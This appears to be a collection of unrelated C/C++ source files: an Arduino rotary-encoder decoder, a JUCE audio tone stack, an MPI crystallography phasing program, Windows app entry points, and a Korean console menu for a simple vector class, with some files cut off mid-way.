    "/* Rotary encoder handler for arduino. v1.1\n\n   Copyright 2011 Ben Buxton. Licenced under the GNU GPL Version 3.\n   Contact: bb@cactii.net\n\n   A typical mechanical rotary encoder emits a two bit gray code\n   on 3 output pins. Every step in the output (often accompanied\n   by a physical 'click') generates a specific sequence of output\n   codes on the pins.\n\n   There are 3 pins used for the rotary encoding - one common and\n   two 'bit' pins.\n\n   The following is the typical sequence of code on the output when\n   moving from one step to the next:\n\n   Position Bit1 Bit2\n   ----------------------\n   Step1 0 0\n   1/4   1 0\n   1/2   1 1\n   3/4   0 1\n   Step2 0 0\n\n   From this table, we can see that when moving from one 'click' to\n   the next, there are 4 changes in the output code.\n\n   - From an initial 0 - 0, Bit1 goes high, Bit0 stays low.\n   - Then both bits are high, halfway through the step.\n   - Then Bit1 goes low, but Bit2 stays high.\n   - Finally at the end of the step, both bits return to 0.\n\n   Detecting the direction is easy - the table simply goes in the other\n   direction (read up instead of down).\n\n   To decode this, we use a simple state machine. Every time the output\n   code changes, it follows state, until finally a full steps worth of\n   code is received (in the correct order). At the final 0-0, it returns\n   a value indicating a step in one direction or the other.\n\n   It's also possible to use 'half-step' mode. This just emits an event\n   at both the 0-0 and 1-1 positions. This might be useful for some\n   encoders where you want to detect all positions.\n\n   If an invalid state happens (for example we go from '0-1' straight\n   to '1-0'), the state machine resets to the start until 0-0 and the\n   next valid codes occur.\n\n   The biggest advantage of using a state machine over other algorithms\n   is that this has inherent debounce built in. Other algorithms emit spurious\n   output with switch bounce, but this one will simply flip between\n   sub-states until the bounce settles, then continue along the state\n   machine.\n   A side effect of debounce is that fast rotations can cause steps to\n   be skipped. By not requiring debounce, fast rotations can be accurately\n   measured.\n   Another advantage is the ability to properly handle bad state, such\n   as due to EMI, etc.\n   It is also a lot simpler than others - a static state table and less\n   than 10 lines of logic. */\n\n#include \"Arduino.h\"\n#include \"Rotary.h\"\n\n/* The below state table has, for each state (row), the new state\n   to set based on the next encoder output. From left to right in,\n   the table, the encoder outputs are 00, 01, 10, 11, and the value\n   in that position is the new state to set. */\n\n#define R_START       0x0\n#ifdef HALF_STEP\n// Use the half-step state table (emits a code at 00 and 11)\n#define R_CCW_BEGIN   0x1\n#define R_CW_BEGIN    0x2\n#define R_START_M     0x3\n#define R_CW_BEGIN_M  0x4\n#define R_CCW_BEGIN_M 0x5\nconst unsigned char ttable[6][4] = {\n  // R_START (00)\n  {R_START_M, R_CW_BEGIN, R_CCW_BEGIN, R_START},\n  // R_CCW_BEGIN\n  {R_START_M | DIR_CCW, R_START, R_CCW_BEGIN, R_START},\n  // R_CW_BEGIN\n  {R_START_M | DIR_CW, R_CW_BEGIN, R_START, R_START},\n  // R_START_M (11)\n  {R_START_M, R_CCW_BEGIN_M, R_CW_BEGIN_M, R_START},\n  // R_CW_BEGIN_M\n  {R_START_M, R_START_M, R_CW_BEGIN_M, R_START | DIR_CW},\n  // R_CCW_BEGIN_M\n  {R_START_M, R_CCW_BEGIN_M, R_START_M, R_START | DIR_CCW},\n};\n#else\n// Use the full-step state table (emits a code at 00 only)\n#define R_CW_FINAL  0x1\n#define R_CW_BEGIN  0x2\n#define R_CW_NEXT   0x3\n#define R_CCW_BEGIN 0x4\n#define R_CCW_FINAL 0x5\n#define R_CCW_NEXT  0x6\n\nconst unsigned char ttable[7][4] = {\n  // R_START\n  {R_START, R_CW_BEGIN, R_CCW_BEGIN, R_START},\n  // R_CW_FINAL\n  {R_CW_NEXT, R_START, R_CW_FINAL, R_START | DIR_CW},\n  // R_CW_BEGIN\n  {R_CW_NEXT, R_CW_BEGIN, R_START, R_START},\n  // R_CW_NEXT\n  {R_CW_NEXT, R_CW_BEGIN, R_CW_FINAL, R_START},\n  // R_CCW_BEGIN\n  {R_CCW_NEXT, R_START, R_CCW_BEGIN, R_START},\n  // R_CCW_FINAL\n  {R_CCW_NEXT, R_CCW_FINAL, R_START, R_START | DIR_CCW},\n  // R_CCW_NEXT\n  {R_CCW_NEXT, R_CCW_FINAL, R_CCW_BEGIN, R_START},\n};\n#endif\n\n// Constructor. Each arg is the pin number for each encoder contact\nRotary::Rotary(char _pin1, char _pin2) {\n  // Assign variables\n  pin1 = _pin1;\n  pin2 = _pin2;\n  // Set pins to input.\n  pinMode(pin1, INPUT);\n  pinMode(pin2, INPUT);\n#ifdef ENABLE_PULLUPS\n  digitalWrite(pin1, HIGH);\n  digitalWrite(pin2, HIGH);\n#endif\n  // Initialise state\n  state = R_START;\n}\n\nunsigned char Rotary::process() {\n  // Grab state of input pins\n  unsigned char pinstate = (digitalRead(pin2) << 1) | digitalRead(pin1);\n  // Determine new state from the pins and state table\n  state = ttable[state & 0xf][pinstate];\n  // Return emit bits, ie the generated event\n  return state & 0x30;\n}\n\n",
    "// toneStack.cpp\n\n#include \"ToneStack.h\"\n\nvoid ToneStack::prepare(const juce::dsp::ProcessSpec& spec)\n{\n  midPeakFilter.reset();\n  lowShelfFilter.reset();\n  highShelfFilter.reset();\n}\n\nvoid ToneStack::reset()\n{\n  midPeakFilter.reset();\n  lowShelfFilter.reset();\n  highShelfFilter.reset();\n}\n\nvoid ToneStack::updateCoefficients(float sampleRate)\n{\n  if (std::abs(driveParam - lastSmoothedDrive) > 0.0001f) {\n    float shelfGainDb = 1.0f * driveParam;\n    float shelfGainLin = juce::Decibels::decibelsToGain(shelfGainDb);\n\n    auto lowCoeffs = juce::dsp::IIR::Coefficients<float>::makeLowShelf(sampleRate, 90.0, 0.707f, shelfGainLin);\n    auto highCoeffs = juce::dsp::IIR::Coefficients<float>::makeHighShelf(sampleRate, 14000.0, 0.707f, shelfGainLin);\n    auto midPeakCoeffs = juce::dsp::IIR::Coefficients<float>::makePeakFilter(sampleRate, 600.0f, 0.7f, 1.412f * driveParam);\n\n    midPeakFilter.coefficients = midPeakCoeffs;\n    lowShelfFilter.coefficients = lowCoeffs;\n    highShelfFilter.coefficients = highCoeffs;\n\n    lastSmoothedDrive = driveParam;\n  }\n}\n\nvoid ToneStack::processAudioBlock(float sampleRate, juce::dsp::AudioBlock<float>& oversampledBlock)\n{\n  // Update coefficients if drive has changed\n  updateCoefficients(sampleRate);\n\n  // Create a DSP context that wraps our incoming block\n  juce::dsp::ProcessContextReplacing<float> context(oversampledBlock);\n\n  // Then apply the shelf and peak filters sample by sample\n  const auto numChannels = oversampledBlock.getNumChannels();\n  const auto numSamples = oversampledBlock.getNumSamples();\n\n  for (size_t ch = 0; ch < numChannels; ++ch)\n  {\n    float* channelData = oversampledBlock.getChannelPointer(ch);\n    for (size_t i = 0; i < numSamples; ++i)\n    {\n      float x = channelData[i];\n      x = lowShelfFilter.processSample(x);\n      x = highShelfFilter.processSample(x);\n      x = midPeakFilter.processSample(x);\n      channelData[i] = x;\n    }\n  }\n}\n",
    "/*\nicpc *.cpp -lmkl_intel_lp64 -lmkl_sequential -lmkl_core -lpthread -lm -O\n*/\n\n#include \"../crysPara.hpp\"\n\nint main(int argc, char** argv) {\n\n    //start MPI    \n    MPI_Init(&argc, &argv);\n    MPI_Comm_rank(MPI_COMM_WORLD, &commRank);\n    MPI_Comm_size(MPI_COMM_WORLD, &commSize);\n\t\n    //compute resolution of each unique structure factor, output uniqStruFactReso\n    computeUniqStruFactReso();\n    \n    /***************************************************************************\n\n                compute true phases for all allowed origin translation\n\n    ***************************************************************************/\n    //read in Fmodel got from Phenix (and CCP4) with bulk solvent correction, output struFactAmplCal and struFactPhase\n    fileNameStream.str( string() );\n    fileNameStream.clear();\n    fileNameStream << \"../\" << PDB_CODE << \"_fmodel.hkl,.HKL,.sca\";\n    inputFmodel(fileNameStream.str());\n\n    //generate true phases for all allowed origin trans, input uniqStruFactAmplCal and uniqStruFactPhase, output truePhaseOrigTran\n    fileNameStream.str( string() );\n    fileNameStream.clear();\n    fileNameStream << PDB_CODE << \"_true_phase_orig_tran_\"; //.txt\n    generateTruePhaseForAllOrigTran(\"not output true phases\", fileNameStream.str());\n\n\n    /***************************************************************************\n\n                compute true prot mask for all allowed origin translation\n\n    ***************************************************************************/\n\n    //read in Fmodel got from Phenix (and CCP4) with bulk solvent correction, output struFactAmplCal and struFactPhase\n    fileNameStream.str( string() );\n    fileNameStream.clear();\n    fileNameStream << \"../\" << PDB_CODE << \"_fatom.hkl,.HKL,.sca\";\n    inputFmodel(fileNameStream.str());\n\n    //generate true prot mask for all origin trans, input uniqStruFactAmplCal and uniqStruFactPhase, output trueProtMaskOrigTran\n    generateTrueProtMaskForAllOrigTran();\n    \n\n    /***************************************************************************\n\n                input observed structure factor amplitude\n\n    ***************************************************************************/\n    //read in observerd diffraction data in experiment, reserved in uniqStruFactStat, uniqStruFactAmplObs, uniqStruFactAmplObsSigm\n    //data format (3%5d, %2d, %9.1f, %7.1f, %8.3f) for h, k, l, obsStatus, obssf, obssfSigma, resolution\n    fileNameStream.str( string() );\n    fileNameStream.clear();\n    fileNameStream << \"../\" << PDB_CODE << \"_uniq_sf.txt\";\n    inputUniqStruFactAmplObs(fileNameStream.str());\n\n\n    /***************************************************************************\n\n                input observed reference histogram\n\n    ***************************************************************************/\n    \n    //read in the boundary values of reference protein hist, reserved in stdBoundLargeBin\n    fileNameStream.str( string() );\n    fileNameStream.clear();\n    fileNameStream << \"../\" << PDB_CODE_REFE_HIST << \"_hist.txt\";\n    inputRefeHist(fileNameStream.str());\n\n    /***************************************************************************\n\n                input SigmWeigObs\n\n    ***************************************************************************/\n    /*\n    //read in the sigmweigobs\n    fileNameStream.str( string() );\n    fileNameStream.clear();\n    fileNameStream << \"../\" << PDB_CODE << \"_iter_sigm.txt\";\n    inputSigmWeigObsAndSigmWeigAvg(fileNameStream.str());\n    */\n    /***************************************************************************\n\n                initialize random density in asu\n\n    ***************************************************************************/\n    /*\n    //read in density in asu from deposited pdb file, each atom is represented by density 1.0\n    unsigned long seed = mixClockTimeGetid();\n    fileNameStream.str( string() );\n    fileNameStream.clear();\n    fileNameStream << commRank << \"_rand_seed_init_dens_asu.txt\";\n    ofstream outputSeed(fileNameStream.str().c_str());\n    outputSeed << seed << endl;    outputSeed.close();\n    fileNameStream.str( string() );\n    fileNameStream.clear();\n    fileNameStream << \"../\" << PDB_CODE << \".pdb\";\n    srand (seed); //initialize random seed\n    inputDensAsuFromPdb(fileNameStream.str(), 0.005); //input random 2% atom positions\n    */\n    /*\n    //generate random density in asu\n    unsigned long seed = mixClockTimeGetid();\n    fileNameStream.str( string() );\n    fileNameStream.clear();\n    fileNameStream << commRank << \"_rand_seed_init_dens_asu.txt\";\n    ofstream outputSeed(fileNameStream.str().c_str());\n    outputSeed << seed << endl;    outputSeed.close();\n    generateRandDensAsu(seed);\n    */\n    //read in the boundary values of reference protein hist, reserved in stdBoundLargeBin\n    fileNameStream.str( string() );\n    fileNameStream.clear();\n    fileNameStream << commRank << \"_rand_seed_init_dens_asu.txt\";\n    unsigned long seed = inputRand",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"breytcg\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff// WindowsProject1.cpp : \u5b9a\u4e49\u5e94\u7528\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\u3002\r\n//\r\n\r\n#include \"framework.h\"\r\n#include \"WindowsProject1.h\"\r\n\r\n#define MAX_LOADSTRING 100\r\n\r\n// \u5168\u5c40\u53d8\u91cf:\r\nHINSTANCE hInst;                                // \u5f53\u524d\u5b9e\u4f8b\r\nWCHAR szTitle[MAX_LOADSTRING];                  // \u6807\u9898\u680f\u6587\u672c\r\nWCHAR szWindowClass[MAX_LOADSTRING];            // \u4e3b\u7a97\u53e3\u7c7b\u540d\r\n\r\n// \u6b64\u4ee3\u7801\u6a21\u5757\u4e2d\u5305\u542b\u7684\u51fd\u6570\u7684\u524d\u5411\u58f0\u660e:\r\nATOM                MyRegisterClass(HINSTANCE hInstance);\r\nBOOL                InitInstance(HINSTANCE, int);\r\nLRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);\r\nINT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);\r\n\r\nint APIENTRY wWinMain(_In_ HINSTANCE hInstance,\r\n                     _In_opt_ HINSTANCE hPrevInstance,\r\n                     _In_ LPWSTR    lpCmdLine,\r\n                     _In_ int       nCmdShow)\r\n{\r\n    UNREFERENCED_PARAMETER(hPrevInstance);\r\n    UNREFERENCED_PARAMETER(lpCmdLine);\r\n\r\n    // TODO: \u5728\u6b64\u5904\u653e\u7f6e\u4ee3\u7801\u3002\r\n\r\n    // \u521d\u59cb\u5316\u5168\u5c40\u5b57\u7b26\u4e32\r\n    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);\r\n    LoadStringW(hInstance, IDC_WINDOWSPROJECT1, szWindowClass, MAX_LOADSTRING);\r\n    MyRegisterClass(hInstance);\r\n\r\n    // \u6267\u884c\u5e94\u7528\u7a0b\u5e8f\u521d\u59cb\u5316:\r\n    if (!InitInstance (hInstance, nCmdShow))\r\n    {\r\n        return FALSE;\r\n    }\r\n\r\n    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WINDOWSPROJECT1));\r\n\r\n    MSG msg;\r\n\r\n    // \u4e3b\u6d88\u606f\u5faa\u73af:\r\n    while (GetMessage(&msg, nullptr, 0, 0))\r\n    {\r\n        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))\r\n        {\r\n            TranslateMessage(&msg);\r\n            DispatchMessage(&msg);\r\n        }\r\n    }\r\n\r\n    return (int) msg.wParam;\r\n}\r\n\r\n\r\n\r\n//\r\n//  \u51fd\u6570: MyRegisterClass()\r\n//\r\n//  \u76ee\u6807: \u6ce8\u518c\u7a97\u53e3\u7c7b\u3002\r\n//\r\nATOM MyRegisterClass(HINSTANCE hInstance)\r\n{\r\n    WNDCLASSEXW wcex;\r\n\r\n    wcex.cbSize = sizeof(WNDCLASSEX);\r\n\r\n    wcex.style          = CS_HREDRAW | CS_VREDRAW;\r\n    wcex.lpfnWndProc    = WndProc;\r\n    wcex.cbClsExtra     = 0;\r\n    wcex.cbWndExtra     = 0;\r\n    wcex.hInstance      = hInstance;\r\n    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_WINDOWSPROJECT1));\r\n    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);\r\n    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);\r\n    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_WINDOWSPROJECT1);\r\n    wcex.lpszClassName  = szWindowClass;\r\n    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));\r\n\r\n    return RegisterClassExW(&wcex);\r\n}\r\n\r\n//\r\n//   \u51fd\u6570: InitInstance(HINSTANCE, int)\r\n//\r\n//   \u76ee\u6807: \u4fdd\u5b58\u5b9e\u4f8b\u53e5\u67c4\u5e76\u521b\u5efa\u4e3b\u7a97\u53e3\r\n//\r\n//   \u6ce8\u91ca:\r\n//\r\n//        \u5728\u6b64\u51fd\u6570\u4e2d\uff0c\u6211\u4eec\u5728\u5168\u5c40\u53d8\u91cf\u4e2d\u4fdd\u5b58\u5b9e\u4f8b\u53e5\u67c4\u5e76\r\n//        \u521b\u5efa\u548c\u663e\u793a\u4e3b\u7a0b\u5e8f\u7a97\u53e3\u3002\r\n//\r\nBOOL InitInstance(HINSTANCE hInstance, int nCmdShow)\r\n{\r\n   hInst = hInstance; // \u5c06\u5b9e\u4f8b\u53e5\u67c4\u5b58\u50a8\u5728\u5168\u5c40\u53d8\u91cf\u4e2d\r\n\r\n   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,\r\n      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);\r\n\r\n   if (!hWnd)\r\n   {\r\n      return FALSE;\r\n   }\r\n\r\n   ShowWindow(hWnd, nCmdShow);\r\n   UpdateWindow(hWnd);\r\n\r\n   return TRUE;\r\n}\r\n\r\n//\r\n//  \u51fd\u6570: WndProc(HWND, UINT, WPARAM, LPARAM)\r\n//\r\n//  \u76ee\u6807: \u5904\u7406\u4e3b\u7a97\u53e3\u7684\u6d88\u606f\u3002\r\n//\r\n//  WM_COMMAND  - \u5904\u7406\u5e94\u7528\u7a0b\u5e8f\u83dc\u5355\r\n//  WM_PAINT    - \u7ed8\u5236\u4e3b\u7a97\u53e3\r\n//  WM_DESTROY  - \u53d1\u9001\u9000\u51fa\u6d88\u606f\u5e76\u8fd4\u56de\r\n//\r\n//\r\nLRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)\r\n{\r\n    switch (message)\r\n    {\r\n    case WM_COMMAND:\r\n        {\r\n            int wmId = LOWORD(wParam);\r\n            // \u5206\u6790\u83dc\u5355\u9009\u62e9:\r\n            switch (wmId)\r\n            {\r\n            case IDM_ABOUT:\r\n                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);\r\n                break;\r\n            case IDM_EXIT:\r\n                DestroyWindow(hWnd);\r\n                break;\r\n            default:\r\n                return DefWindowProc(hWnd, message, wParam, lParam);\r\n            }\r\n        }\r\n        break;\r\n    case WM_PAINT:\r\n        {\r\n            PAINTSTRUCT ps;\r\n            HDC hdc = BeginPaint(hWnd, &ps);\r\n            // TODO: \u5728\u6b64\u5904\u6dfb\u52a0\u4f7f\u7528 hdc \u7684\u4efb\u4f55\u7ed8\u56fe\u4ee3\u7801...\r\n            EndPaint(hWnd, &ps);\r\n        }\r\n        break;\r\n    case WM_DESTROY:\r\n        PostQuitMessage(0);\r\n        break;\r\n    default:\r\n        return DefWindowProc(hWnd, message, wParam, lParam);\r\n    }\r\n    return 0;\r\n}\r\n\r\n// \u201c\u5173\u4e8e\u201d\u6846\u7684\u6d88\u606f\u5904\u7406\u7a0b\u5e8f\u3002\r\nINT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)\r\n{\r\n    UNREFERENCED_PARAMETER(lParam);\r\n    switch (message)\r\n    {\r\n    case WM_INITDIALOG:\r\n        return (INT_PTR)TRUE;\r\n\r\n    case WM_COMMAND:\r\n        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)\r\n        {\r\n            EndDialog(hDlg, LOWORD(wParam));\r\n            return (INT_PTR)TRUE;\r\n        }\r\n        break;\r\n    }\r\n    return (INT_PTR)FALSE;\r\n}\r\n",
    "#include <iostream>\n#include <vector>\n#include <string>\n//\ud5e4\ub354 \ucc38\uc870\n#include \"SimpleVector.h\"\n\n\nusing namespace std;\n\nint main() {\n    \n    int chk;\n    int input;\n\n    while (true)\n    {\n        int check;\n        ::cout << \"Data\uc5d0 \uc22b\uc790 \uc800\uc7a5\ud558\uae30\" << endl;\n        ::cout << \"1. \uae30\ubcf8 \ubaa9\ub85d\uc5d0 \uc800\uc7a5\ud558\uae30(10\uac1c)\" << endl;\n        ::cout << \"2. \uc9c0\uc815\ud55c \uac2f\uc218\uc758 \ubaa9\ub85d\uc5d0 \uc800\uc7a5\ud558\uae30\" << endl;\n        ::cin >> check;\n\n        if (check == 1)\n        {\n            ::cout << \"\uae30\ubcf8 \ubaa9\ub85d\uc5d0 \uc800\uc7a5\ud558\uae30\ub97c \uc120\ud0dd\ud558\uc168\uc2b5\ub2c8\ub2e4.\" << endl;\n            chk = check;\n            break;\n        }\n        else if (check == 2)\n        {\n            ::cout << \"\uc9c0\uc815\ud55c \uac2f\uc218\uc758 \ubaa9\ub85d\uc5d0 \uc800\uc7a5\ud558\uae30\ub97c \uc120\ud0dd\ud558\uc168\uc2b5\ub2c8\ub2e4.\" << endl;\n            ::cout << \"\uc22b\uc790\ub97c \uc785\ub825\ud574\uc8fc\uc138\uc694 : \";\n            ::cin >> input;\n            chk = check;\n            break;\n        }\n        else\n        {\n            // \uc798\ubabb\ub41c \uc785\ub825 \ucc98\ub9ac\n            // \uba54\ub274\uc5d0 \uc5c6\ub294 \ubc88\ud638\ub97c \uc785\ub825\ud588\uc744 \uacbd\uc6b0 \uacbd\uace0 \uba54\uc2dc\uc9c0\ub97c \ucd9c\ub825\ud569\ub2c8\ub2e4.\n            ::cout << \"\uc798\ubabb\ub41c \uc785\ub825\uc785\ub2c8\ub2e4. \ub2e4\uc2dc \uc2dc\ub3c4\ud558\uc138\uc694.\" << endl;\n        }\n    }\n\n\n    //\uae30\ubcf8\uac12\uc77c\ub54c\n    if (chk == 1)\n    {\n        SimpleVector<int> T;\n\n        while (true)\n        {\n            ::cout << \"\\n\ubaa9\ub85d\" << endl;\n            ::cout << \"1. \uc22b\uc790 \ubaa9\ub85d\uc5d0 \ucd94\uac00\" << endl;\n            ::cout << \"2. \uc22b\uc790 \ubaa9\ub85d\uc5d0\uc11c \uc81c\uac70\" << endl;\n            ::cout << \"3. \ud604\uc7ac \ubaa9\ub85d \uac2f\uc218 \ucd9c\ub825\" << endl;\n            ::cout << \"4. \ubaa9\ub85d \ucd5c\ub300 \uac2f\uc218 \ucd9c\ub825\" << endl;\n            ::cout << \"5. \uc885\ub8cc\" << endl;\n            ::cout << \"\uc120\ud0dd: \";\n\n            int choice; // \uc0ac\uc6a9\uc790\uc758 \uba54\ub274 \uc120\ud0dd\uc744 \uc800\uc7a5\n            ::cin >> choice;\n\n            if (choice == 1) {\n                // 1\ubc88 \uc120\ud0dd: \uc22b\uc790 \ucd94\uac00\n                // \uc0ac\uc6a9\uc790\ub85c\ubd80\ud130 \uc22b\uc790\ub97c \uc785\ub825\ubc1b\uc544 data\uc5d0 \ucd94\uac00\ud569\ub2c8\ub2e4.\n                int num;\n                ::cout << \"\uc22b\uc790\ub97c \uc785\ub825\ud574\uc8fc\uc138\uc694 : \";\n                ::cin.ignore(); // \uc774\uc804 \uc785\ub825\uc758 \uc794\uc5ec \ubc84\ud37c\ub97c \uc81c\uac70\n                ::cin >> num; // \uc22b\uc790 \uc785\ub825\n                T.push_back(num);// \uc785\ub825\ubc1b\uc740 \uc22b\uc790 \uc815\ubcf4\ub97c \ucd94\uac00\n            }\n            else if (choice == 2) {\n                // 2\ubc88 \uc120\ud0dd: \uc22b\uc790 \uc81c\uac70 (\uc824\ub4a4\uc5d0\uc11c \ubd80\ud130 \uc81c\uac70)\n                // \ud604\uc7ac data\uc5d0 \uc800\uc7a5\ub41c \uc22b\uc790\uc911 \uc824 \ub4a4\uc5d0\uc788\ub294\uac83\ubd80\ud130 \uc81c\uac70\n                T.pop_back();\n            }\n            else if (choice == 3)\n            {\n                // 3\ubc88 \uc120\ud0dd : \ud604\uc7ac \ubaa9\ub85d \uac2f\uc218 \ucd9c\ub825\n                // \ud604\uc7ac BookManager\uc5d0 \uc800\uc7a5\ub41c \ucc45 \ubaa9\ub85d\uc5d0\uc11c \uc81c\ubaa9\uc73c\ub85c \ucc45\uc774 \uc788\ub294\uc9c0 \uac80\uc0c9\ud569\ub2c8\ub2e4.\n                int size = T.size();\n                ::cout << \"\ubc30\uc5f4\uc758 \ud604\uc7ac \ud06c\uae30\ub294 : \" << size << endl;\n            }\n            else if (choice == 4)\n            {\n                // 4\ubc88 \uc120\ud0dd : \ubaa9\ub85d \ucd5c\ub300 \uac2f\uc218 \ucd9c\ub825\n                // \ud604\uc7ac BookManager\uc5d0 \uc800\uc7a5\ub41c \ucc45 \ubaa9\ub85d\uc5d0\uc11c \uc800\uc790\ub85c \ucc45\uc774 \uc788\ub294\uc9c0 \uac80\uc0c9\ud569\ub2c8\ub2e4.\n                int capacity = T.capacity();\n                ::cout << \"\ubc30\uc5f4\uc758 \ucd5c\ub300 \ud06c\uae30\ub294 : \" << capacity << endl;\n            }\n            else if (choice == 5) {\n                // 5\ubc88 \uc120\ud0dd: \uc885\ub8cc\n                // \ud504\ub85c\uadf8\ub7a8\uc744 \uc885\ub8cc\ud558\uace0 \uc0ac\uc6a9\uc790\uc5d0\uac8c \uba54\uc2dc\uc9c0\ub97c \ucd9c\ub825\ud569\ub2c8\ub2e4.\n                ::cout << \"\ud504\ub85c\uadf8\ub7a8\uc744 \uc885\ub8cc\ud569\ub2c8\ub2e4.\" << endl;\n                break; // while \ub8e8\ud504 \uc885\ub8cc\n            }\n            else {\n                // \uc798\ubabb\ub41c \uc785\ub825 \ucc98\ub9ac\n                // \uba54\ub274\uc5d0 \uc5c6\ub294 \ubc88\ud638\ub97c \uc785\ub825\ud588\uc744 \uacbd\uc6b0 \uacbd\uace0 \uba54\uc2dc\uc9c0\ub97c \ucd9c\ub825\ud569\ub2c8\ub2e4.\n                ::cout << \"\uc798\ubabb\ub41c \uc785\ub825\uc785\ub2c8\ub2e4. \ub2e4\uc2dc \uc2dc\ub3c4\ud558\uc138\uc694.\" << endl;\n            }\n        }//while \ub05d\ubd80\ubd84\n    }\n    else\n    {\n        SimpleVector<int> T(input);\n\n        while (true)\n        {\n            ::cout << \"\\n\ubaa9\ub85d\" << endl;\n            ::cout << \"1. \uc22b\uc790 \ubaa9\ub85d\uc5d0 \ucd94\uac00\" << endl;\n            ::cout << \"2. \uc22b\uc790 \ubaa9\ub85d\uc5d0\uc11c \uc81c\uac70\" << endl;\n            ::cout << \"3. \ud604\uc7ac \ubaa9\ub85d \uac2f\uc218 \ucd9c\ub825\" << endl;\n            ::cout << \"4. \ubaa9\ub85d \ucd5c\ub300 \uac2f\uc218 \ucd9c\ub825\" << endl;\n            ::cout << \"5. \uc885\ub8cc\" << endl;\n            ::cout << \"\uc120\ud0dd: \";\n\n            int choice; // \uc0ac\uc6a9\uc790\uc758 \uba54\ub274 \uc120\ud0dd\uc744 \uc800\uc7a5\n            ::cin >> choice;\n\n            if (choice == 1) {\n                // 1\ubc88 \uc120\ud0dd: \uc22b\uc790 \ucd94\uac00\n                // \uc0ac\uc6a9\uc790\ub85c\ubd80\ud130 \uc22b\uc790\ub97c \uc785\ub825\ubc1b\uc544 data\uc5d0 \ucd94\uac00\ud569\ub2c8\ub2e4.\n                int num;\n                ::cout << \"\uc22b\uc790\ub97c \uc785\ub825\ud574\uc8fc\uc138\uc694 : \";\n                ::cin.ignore(); // \uc774\uc804 \uc785\ub825\uc758 \uc794\uc5ec \ubc84\ud37c\ub97c \uc81c\uac70\n                ::cin >> num; // \uc22b\uc790 \uc785\ub825\n                T.push_back(num);// \uc785\ub825\ubc1b\uc740 \uc22b\uc790 \uc815\ubcf4\ub97c \ucd94\uac00\n            }\n            else if (choice == 2) {\n                // 2\ubc88 \uc120\ud0dd: \uc22b\uc790 \uc81c\uac70 (\uc824\ub4a4\uc5d0\uc11c \ubd80\ud130 \uc81c\uac70)\n                // \ud604\uc7ac data\uc5d0 \uc800\uc7a5\ub41c \uc22b\uc790\uc911 \uc824 \ub4a4\uc5d0\uc788\ub294\uac83\ubd80\ud130 \uc81c\uac70\n                T.pop_back();\n            }\n            else if (choice == 3)\n            {\n                // 3\ubc88 \uc120\ud0dd : \ud604\uc7ac \ubaa9\ub85d \uac2f\uc218 \ucd9c\ub825\n                // \ud604\uc7ac BookManager\uc5d0 \uc800\uc7a5\ub41c \ucc45 \ubaa9\ub85d\uc5d0\uc11c \uc81c\ubaa9\uc73c\ub85c \ucc45\uc774 \uc788\ub294\uc9c0 \uac80\uc0c9\ud569\ub2c8\ub2e4.\n                int size = T.size();\n                ::cout << \"\ubc30\uc5f4\uc758 \ud604\uc7ac \ud06c\uae30\ub294 : \" << size << endl;\n            }\n            else if (choice == 4)\n            {\n                // 4\ubc88 \uc120\ud0dd : \ubaa9\ub85d \ucd5c\ub300 \uac2f\uc218 \ucd9c\ub825\n                // \ud604\uc7ac BookManager\uc5d0 \uc800\uc7a5\ub41c \ucc45 \ubaa9\ub85d\uc5d0\uc11c \uc800\uc790\ub85c \ucc45\uc774 \uc788\ub294\uc9c0 \uac80\uc0c9\ud569\ub2c8\ub2e4.\n                int capacity = T.capacity();\n                ::cout << \"\ubc30\uc5f4\uc758 \ucd5c\ub300 \ud06c\uae30\ub294 : \" << capacity << endl;\n            }\n            else if (choice == 5) {\n                // 5\ubc88 \uc120\ud0dd: \uc885\ub8cc\n                // \ud504\ub85c\uadf8\ub7a8\uc744 \uc885\ub8cc\ud558\uace0 \uc0ac\uc6a9\uc790\uc5d0\uac8c \uba54\uc2dc\uc9c0\ub97c \ucd9c\ub825\ud569\ub2c8\ub2e4.\n                ::cout << \"\ud504\ub85c\uadf8\ub7a8\uc744 \uc885\ub8cc\ud569\ub2c8\ub2e4.\" << endl;\n                break; // while \ub8e8\ud504 \uc885\ub8cc\n            }\n            else {\n                // 